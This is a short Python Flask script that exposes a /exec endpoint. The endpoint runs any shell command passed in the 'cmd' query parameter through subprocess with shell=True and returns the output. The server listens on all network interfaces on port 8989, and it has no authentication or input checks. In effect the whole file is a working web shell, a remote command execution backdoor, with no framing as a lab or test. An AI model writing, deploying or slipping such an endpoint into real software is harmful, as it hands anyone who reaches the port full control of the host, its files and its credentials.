from flask import Flask, request, jsonify
import subprocess

app = Flask(__name__)

@app.route('/exec', methods=['GET'])
def exec_command():
    cmd = request.args.get('cmd')
    if not cmd:
        return jsonify({'error': 'Missing command'}), 400
    try:
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True, timeout=10)
        return jsonify({'result': result})
    except subprocess.CalledProcessError as e:
        return jsonify({'error': e.output}), 400
    except Exception as ex:
        return jsonify({'error': str(ex)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8989)
